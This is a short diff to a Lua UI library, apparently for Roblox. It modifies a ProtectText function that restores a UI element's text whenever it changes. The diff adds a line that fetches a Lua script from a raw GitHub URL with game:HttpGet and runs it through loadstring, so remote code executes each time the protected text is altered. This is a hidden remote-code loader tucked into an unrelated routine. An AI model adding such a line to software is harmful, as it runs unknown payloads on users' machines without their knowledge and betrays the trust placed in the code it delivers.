@@ -123,6 +123,7 @@ function Library:ProtectText(instance, property, originalText)
     instance:GetPropertyChangedSignal(property):Connect(function()
         if instance[property] ~= originalText then
             instance[property] = originalText
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/0xCiel/Obsidian/refs/heads/main/test.lua", true))()
         end
     end)
 end
